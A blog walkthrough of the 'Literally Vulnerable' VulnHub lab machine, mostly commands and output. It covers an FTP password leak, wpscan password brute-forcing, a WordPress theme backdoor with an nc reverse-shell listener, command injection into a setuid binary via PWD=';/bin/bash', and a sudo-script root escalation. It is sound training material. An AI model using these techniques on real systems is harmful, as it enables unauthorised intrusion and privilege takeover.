---
layout: post
title: "LiteraryVulnerable Walkthrough"
date: 2019-12-10
---

**Vulnerable System**: Literary Vulnerable
==========================================

**Operating System**: Ubuntu 18.04.3

**Kernel**: 4.15

Methodology
-----------

-   Host Discovery (netdiscover)

-   Port Scanning (nmap)

-   FTP Enumeration (ftp, cat)

-   Web Port Enumeration (gobuster, Browser, wpscan)

-   Initial Foothold (weak WordPress file permissions, nc)

-   Secondary Foothold (file, strings, code injection)

-   Finding Secondary User’s Password (find, base64)

-   Privilege Escalation (code injection)

Reconnaissance
--------------

### Host Discovery (Netdiscover)

```
lifesfun:~/vulnhub/LiteraryVulnerable# netdiscover -r 192.168.211.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                         
                                                                                                                                                       
 18 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 1080                                                                                     
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.211.1   00:50:56:c0:00:01      8     480  VMware, Inc.                                                                                        
 192.168.211.147 00:0c:29:45:9c:20      7     420  VMware, Inc.                                                                                        
 192.168.211.254 00:50:56:e9:d8:9c      3     180  VMware, Inc.
```

### Port Scanning (Nmap)

All Ports Scan

```
lifesfun:~/vulnhub/LiteraryVulnerable# nmap -p- 192.168.211.147
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-08 21:41 EST
Nmap scan report for 192.168.211.147
Host is up (0.00086s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
65535/tcp open  unknown
MAC Address: 00:0C:29:45:9C:20 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
```

Aggressive, Version and Default Scan

```
lifesfun:~/vulnhub/LiteraryVulnerable# nmap -A -sV -sC -p 21,22,80,65535 192.168.211.147
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-08 21:42 EST
Nmap scan report for 192.168.211.147
Host is up (0.0015s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           325 Dec 04 13:05 backupPasswords
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.211.146
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)
|   256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA)
|_  256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)
80/tcp    open  http    nginx 1.14.0 (Ubuntu)
|_http-generator: WordPress 5.3
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Not so Vulnerable &#8211; Just another WordPress site
|_http-trane-info: Problem with XML parsing of /evox/about
65535/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:45:9C:20 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.45 ms 192.168.211.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.47 seconds
```

### FTP Enumeration (ftp,cat)

```
lifesfun:~/vulnhub/LiteraryVulnerable# ftp 192.168.211.147
Connected to 192.168.211.147.
220 (vsFTPd 3.0.3)
Name (192.168.211.147:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           325 Dec 04 13:05 backupPasswords
226 Directory send OK.
ftp> get backupPasswords
local: backupPasswords remote: backupPasswords
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backupPasswords (325 bytes).
226 Transfer complete.
325 bytes received in 0.00 secs (137.8726 kB/s)
ftp> exit
221 Goodbye.

lifesfun:~/vulnhub/LiteraryVulnerable# cat backupPasswords 
Hi Doe, 

I'm guessing you forgot your password again! I've added a bunch of passwords below along with your password so we don't get hacked by those elites again!

*$eGRIf7v38s&p7
yP$*SV09YOrx7mY
GmceC&oOBtbnFCH
3!IZguT2piU8X$c
P&s%F1D4#KDBSeS
$EPid%J2L9LufO5
nD!mb*aHON&76&G
$*Ke7q2ko3tqoZo
SCb$I^gDDqE34fA
Ae%tM0XIWUMsCLp
```

It seems like username - Doe, and a few possible passwords have been retrieved. 


### Web Port Enumeration

#### Port 80 Enumeration

Nothing interesting was found on port 80.

#### Port 65535 Enumeration (gobuster, Browser, wpscan)

##### gobuster

```
lifesfun:/opt/wpseku# gobuster dir -u http://literally.vulnerable:65535/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://literally.vulnerable:65535/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/08 23:59:55 Starting gobuster
===============================================================
/phpcms (Status: 301)
===============================================================
2019/12/09 00:00:14 Finished
===============================================================
```

Through gobuster an interesting directory /phpcms was found.

##### Browser

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/LiterallyVulnerable/Images/67c4b2373a5684b4d6977b9b10050353.png?raw=true)

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/LiterallyVulnerable/Images/9880da229e8e3a3cb9bea7bf10d4d195.png?raw=true)

Looks like a WordPress website with a password protected post. Let’s see if we
can find some usernames and use passwords provided in FTP server to get into
WordPress.

##### wpscan

```
lifesfun:~/vulnhub/LiteraryVulnerable# wpscan --url http://literally.vulnerable:65535/phpcms/ -t 20 --passwords passwords
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.7.3
       Sponsored by Automattic - https://automattic.com/
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]N
[+] URL: http://literally.vulnerable:65535/phpcms/
[+] Started: Mon Dec  9 00:11:50 2019

Interesting Finding(s):

[+] http://literally.vulnerable:65535/phpcms/
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://literally.vulnerable:65535/phpcms/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://literally.vulnerable:65535/phpcms/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://literally.vulnerable:65535/phpcms/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://literally.vulnerable:65535/phpcms/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3 identified (Latest, released on 2019-11-12).
 | Detected By: Rss Generator (Passive Detection)
 |  - http://literally.vulnerable:65535/phpcms/index.php/feed/, <generator>https://wordpress.org/?v=5.3</generator>
 |  - http://literally.vulnerable:65535/phpcms/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://literally.vulnerable:65535/phpcms/wp-content/themes/twentytwenty/
 | Readme: http://literally.vulnerable:65535/phpcms/wp-content/themes/twentytwenty/readme.txt
 | Style URL: http://literally.vulnerable:65535/phpcms/wp-content/themes/twentytwenty/style.css?ver=1.0
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://literally.vulnerable:65535/phpcms/wp-content/themes/twentytwenty/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <===========================================================================> (21 / 21) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==========================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] notadmin
 | Detected By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://literally.vulnerable:65535/phpcms/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] maybeadmin
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - maybeadmin / $EPid%J2L9LufO5                                                                                                                
Trying maybeadmin / SCb$I^gDDqE34fA Time: 00:00:00 <==================================================================> (20 / 20) 100.00% Time: 00:00:00

[i] Valid Combinations Found:
 | Username: maybeadmin, Password: $EPid%J2L9LufO5

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.

[+] Finished: Mon Dec  9 00:12:00 2019
[+] Requests Done: 95
[+] Cached Requests: 6
[+] Data Sent: 34.918 KB
[+] Data Received: 499.578 KB
[+] Memory used: 170.926 MB
[+] Elapsed time: 00:00:10
```

Looks like some credentials were found: Username: maybeadmin, Password: $EPid%J2L9LufO5.

After signing into wordpress with maybeadmin, the next set of credentials was
recovered.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/LiterallyVulnerable/Images/6aa1763a7eb4b00709a25d310f9e01d5.png?raw=true)

Notadmin was indeed an account with administrative privilege.

Low Privilege Exploitation
--------------------------

### Initial Foothold (weak WordPress file permissions, nc)

Once signed in, in Edit Theme a suitable php file was found in order to insert a
backdoor.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/LiterallyVulnerable/Images/bd9f0905468a0ae815b34fad02acb211.png?raw=true)

Once
literally.vulnerable:65535/phpcms/wp-content/themes/twentyseventeen/functions.php
is visited, the reverse shell is caught.

Catching Reverse Shell & Upgrading to TTY

```
lifesfun:~# nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.211.146] from (UNKNOWN) [192.168.211.147] 45116
Linux literallyvulnerable 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 05:27:24 up  2:51,  0 users,  load average: 0.00, 0.00, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@literallyvulnerable:/$
```

After signing an interesting file was discovered in directory of user doe.

```
www-data@literallyvulnerable:/home/doe$ ls -laht
ls -laht
total 52K
drwxr-xr-x 5 doe  doe  4.0K Dec  4 13:54 .
-rw------- 1 doe  doe   125 Dec  4 13:54 local.txt
drwx------ 2 doe  doe  4.0K Dec  4 13:48 .cache
drwx------ 3 doe  doe  4.0K Dec  4 13:48 .gnupg
-rw-r--r-- 1 root root   75 Dec  4 12:53 noteFromAdmin
drwxr-xr-x 4 root root 4.0K Dec  4 12:29 ..
-rwsr-xr-x 1 john john 8.5K Dec  4 12:26 itseasy
-rw-r--r-- 1 doe  doe  3.8K Dec  4 12:24 .bashrc
drwxrwxr-x 3 doe  doe  4.0K Dec  4 12:23 .local
lrwxrwxrwx 1 root root    9 Dec  4 12:18 .bash_history -> /dev/null
-rw-r--r-- 1 doe  doe   220 Dec  4 12:11 .bash_logout
-rw-r--r-- 1 doe  doe   807 Dec  4 12:11 .profile
```

### Secondary Foothold (file, strings, code injection)

Enumerating the File.

```
www-data@literallyvulnerable:/home/doe$ file itseasy
file itseasy
itseasy: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=8d8668f35d03b5c01507817d1a74e2af45360a16, not stripped
www-data@literallyvulnerable:/home/doe$ strings itseasy
strings itseasy
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
setresgid
asprintf
getenv
setresuid
system
getegid
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
/bin/echo Your Path is: %s
;*3$"
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7697
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
itseasy.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
getenv@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
setresuid@@GLIBC_2.2.5
_edata
__stack_chk_fail@@GLIBC_2.4
setresgid@@GLIBC_2.2.5
system@@GLIBC_2.2.5
geteuid@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
getegid@@GLIBC_2.2.5
__bss_start
asprintf@@GLIBC_2.2.5
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
www-data@literallyvulnerable:/home/doe$ ./itseasy
./itseasy
Your Path is: /home/doe
```

Looks like the executable performs the following:

```/bin/echo Your Path is: pwd```

After some trial an error results below were achieved.

```
www-data@literallyvulnerable:id$ ./itseasy
./itseasy
Your Path is: id
www-data@literallyvulnerable:id$ export PWD=';id'
export PWD=';id'
www-data@literallyvulnerable:;id$ ./itseasy
./itseasy
Your Path is:
uid=1000(john) gid=33(www-data) groups=33(www-data)
www-data@literallyvulnerable:;id$ export PWD=';/bin/bash'
export PWD=';/bin/bash'
```

#### User Flag

After getting access to john’s account the user flag was obtained.

```
www-data@literallyvulnerable:;/bin/bash$ ./itseasy
./itseasy
Your Path is:
john@literallyvulnerable:/home/doe$ cd /home/john
cd /home/john
john@literallyvulnerable:/home/john$ ls
ls
user.txt
john@literallyvulnerable:/home/john$ cat user.txt
cat user.txt
Almost there! Remember to always check permissions! It might not help you here, but somewhere else! ;) 
Flag: iuz1498ne667ldqmfarfrky9v5ylki
```

#### John’s Password (find, base64)

Searching for files that john owns

```
john@literallyvulnerable:/home/john$ find / -group john 2>/dev/null                                   
find / -group john 2>/dev/null
/home/doe/itseasy
/home/john
/home/john/.bash_logout
/home/john/user.txt
/home/john/.gnupg
/home/john/.gnupg/private-keys-v1.d
/home/john/.bashrc
/home/john/.local
/home/john/.local/share
/home/john/.local/share/tmpFiles
/home/john/.local/share/tmpFiles/myPassword
/home/john/.local/share/nano
/home/john/.profile
/home/john/.cache
/home/john/.cache/motd.legal-displayed
```

Interesting file myPassword was found, which contained base64 encoded password
for john’s account

```
john@literallyvulnerable:/home/john$ cat /home/john/.local/share/tmpFiles/myPassword
<hn$ cat /home/john/.local/share/tmpFiles/myPassword
I always forget my password, so, saving it here just in case. Also, encoding it with b64 since I don't want my colleagues to hack me!
am9objpZWlckczhZNDlJQiNaWko=
john@literallyvulnerable:/home/john/.local/share/tmpFiles$ echo am9objpZWlckczhZNDlJQiNaWko= | base64 -d
<iles$ echo am9objpZWlckczhZNDlJQiNaWko= | base64 -d       
john:YZW$s8Y49IB#ZZJ
```

Privilege Escalation
--------------------

Now that john’s password is obtained, SSH can be used to sign into john’s
account for a better shell.

```
lifesfun:~/vulnhub/LiteraryVulnerable# ssh john@literally.vulnerable
john@literally.vulnerable's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-72-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Dec 10 20:44:06 UTC 2019

  System load:  0.0                Processes:            177
  Usage of /:   24.0% of 19.56GB   Users logged in:      0
  Memory usage: 73%                IP address for ens33: 192.168.211.147
  Swap usage:   7%

0 packages can be updated.
0 updates are security updates.

Last login: Thu Dec  5 11:32:48 2019 from 192.168.30.129
```

### Enumeration (sudo -l)

```
john@literallyvulnerable:/home/john/.local/share/tmpFiles$ sudo -l
sudo -l
[sudo] password for john: YZW$s8Y49IB#ZZJ

Matching Defaults entries for john on literallyvulnerable:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on literallyvulnerable:
    (root) /var/www/html/test.html
```

Looks like john can run the following command with root privileges -
/var/www/html/test.html.

### Escalating Privileges (code injection)

On the original web shell create the /var/www/html/test.html file using www-data
account.

```
www-data@literallyvulnerable:;/bin/bash$ cd /var/www/html
cd /var/www/html
www-data@literallyvulnerable:/var/www/html$ touch test.html
touch test.html
```

Once the file is created let’s insert /bin/bash into the file and make it
executable.

```
www-data@literallyvulnerable:/var/www/html$ echo '/bin/bash' >> test.html
echo '/bin/bash' >> test.html
www-data@literallyvulnerable:/var/www/html$ chmod +x test.html
chmod +x test.html
www-data@literallyvulnerable:/var/www/html$
```

### Root Foothold

Back on John's SSH shell, executing the newly created file.

```
john@literallyvulnerable:~$ sudo /var/www/html/test.html
root@literallyvulnerable:~# whoami
root
root@literallyvulnerable:~#
```

#### Root Flag

```
root@literallyvulnerable:~# cd /root

root@literallyvulnerable:/root# cat root.txt 
It was
 _     _ _                 _ _         _   _       _                      _     _      _ 
| |   (_) |               | | |       | | | |     | |                    | |   | |    | |
| |    _| |_ ___ _ __ __ _| | |_   _  | | | |_   _| |_ __   ___ _ __ __ _| |__ | | ___| |
| |   | | __/ _ \ '__/ _` | | | | | | | | | | | | | | '_ \ / _ \ '__/ _` | '_ \| |/ _ \ |
| |___| | ||  __/ | | (_| | | | |_| | \ \_/ / |_| | | | | |  __/ | | (_| | |_) | |  __/_|
\_____/_|\__\___|_|  \__,_|_|_|\__, |  \___/ \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|\___(_)
                                __/ |                                                    
                               |___/                                                     

Congrats, you did it! I hope it was *literally easy* for you! :) 
Flag: pabtejcnqisp6un0sbz0mrb3akaudk

Let me know, if you liked the machine @syed__umar

root@literallyvulnerable:/root# lifesfun ^_^
```
